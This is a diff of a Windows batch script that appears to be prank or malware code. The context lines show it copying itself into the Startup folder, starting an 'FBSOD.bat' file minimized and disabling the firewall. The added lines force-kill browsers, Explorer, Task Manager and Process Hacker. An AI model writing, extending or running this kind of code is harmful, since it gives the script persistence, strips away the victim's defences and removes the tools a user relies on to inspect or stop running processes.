@@ -4,6 +4,12 @@ if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%~nx0" (
   copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
 )
 
+taskkill /F /IM "chrome.exe" /T
+taskkill /F /IM "firefox.exe" /T
+taskkill /F /IM "ProcessHacker.exe" /T
+taskkill /F /IM "explorer.exe" /T
+taskkill /F /IM "taskmgr.exe" /T
+
 start /min FBSOD.bat
 
 netsh firewall set opmode disable
